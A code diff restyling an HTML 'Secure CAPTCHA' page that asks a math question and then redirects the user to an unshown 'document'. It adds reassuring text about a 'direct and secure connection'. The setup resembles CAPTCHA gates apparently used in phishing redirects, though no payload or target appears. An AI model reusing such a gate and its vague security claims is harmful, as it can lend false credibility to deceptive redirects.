@@ -8,9 +8,9 @@
     :root {
       --bg: #ffffff;
       --text: #333;
-      --box-bg: linear-gradient(145deg, #f0f0f0, #ffffff);
+      --box-bg: #f7f7f7;
       --primary: #007bff;
-      --success: #28a745;
+      --success-green: #28a745;
     }
 
     * {
@@ -36,7 +36,7 @@
       left: 25px;
       display: flex;
       align-items: center;
-      background: #ffffff;
+      background: var(--box-bg);
       padding: 10px 16px;
       border-radius: 14px;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
@@ -62,28 +62,24 @@
 
     #captcha-box {
       background: var(--box-bg);
-      padding: 35px 30px 30px;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
-      border: 2px solid #e0e0e0;
+      padding: 30px;
+      border-radius: 14px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
       text-align: center;
       width: 100%;
       max-width: 400px;
-      transition: box-shadow 0.3s ease;
     }
 
-    #captcha-box:hover {
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
-    }
-
-    h2 {
-      font-size: 1.5rem;
-      margin-bottom: 22px;
+    .captcha-header {
+      font-size: 1.1rem;
+      font-weight: 500; /* slightly bold */
+      margin-bottom: 18px;
+      color: var(--text);
     }
 
     #captcha-question {
       font-size: 1.2rem;
-      margin-bottom: 14px;
+      margin-bottom: 12px;
     }
 
     input[type="number"] {
@@ -95,12 +91,6 @@
       border: 1px solid #ccc;
       border-radius: 6px;
       text-align: center;
-      transition: border 0.3s ease;
-    }
-
-    input[type="number"]:focus {
-      border-color: var(--primary);
-      outline: none;
     }
 
     button {
@@ -119,7 +109,7 @@
     }
 
     #message {
-      margin-top: 18px;
+      margin-top: 15px;
       font-size: 1.1rem;
       min-height: 24px;
       display: flex;
@@ -129,14 +119,20 @@
     }
 
     .icon-success {
-      width: 26px;
-      height: 26px;
-      filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1));
+      width: 24px;
+      height: 24px;
+    }
+
+    p.note {
+      font-size: 0.88rem;
+      color: #666;
+      margin-top: 20px;
+      line-height: 1.4;
     }
 
     @media (max-width: 480px) {
       #captcha-box {
-        padding: 24px;
+        padding: 20px;
       }
 
       input[type="number"] {
@@ -160,7 +156,7 @@
 </head>
 <body>
 
-  <!-- Top-left Logo (Padlock) -->
+  <!-- Top-left Logo -->
   <div class="logo">
     <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
@@ -168,12 +164,15 @@
 
   <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
-    <h2>Solve this to continue</h2>
+    <div class="captcha-header">For security reasons, please solve this to continue.</div>
     <div id="captcha-question">Loading...</div>
     <input type="number" id="user-answer" placeholder="Your answer" />
     <br />
     <button onclick="validateCaptcha()">Submit</button>
     <div id="message"></div>
+    <p class="note">
+      By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
+    </p>
   </div>
 
   <script>
@@ -219,7 +218,7 @@
           msg.innerText = "Correct! One more to go...";
           generateCaptcha();
         } else {
-          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Green Check" class="icon-success">`;
+          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
           setTimeout(() => {
             redirectUser();
           }, 1500);
